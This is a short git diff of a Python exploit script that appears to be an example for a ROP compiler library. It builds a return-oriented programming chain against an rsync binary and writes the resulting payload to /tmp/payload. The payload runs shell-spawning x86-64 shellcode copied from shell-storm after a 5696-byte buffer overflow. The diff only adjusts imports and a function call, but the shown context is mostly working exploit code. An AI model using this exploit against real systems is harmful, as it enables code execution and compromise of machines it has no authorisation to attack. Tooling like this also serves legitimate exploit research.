@@ -1,7 +1,6 @@
-import sys, logging, binascii
-import archinfo
+import binascii
 from pwn import *
-from rop_compiler import ropme, goal
+from rop_compiler import ropme
 
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
     "\x48\x31\xd2"                                  # xor    %rdx, %rdx
@@ -20,7 +19,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 filename = './rsync'
 files = [(filename, './rsync.gadgets', 0)]
 goals = [["shellcode_hex", binascii.hexlify(shellcode)]]
-rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.ArchAMD64(), logging.DEBUG)
+rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals)
 
 payload = ("A" * 5696) + "J"*8 + rop
 with open("/tmp/payload", "w") as f: f.write(payload)
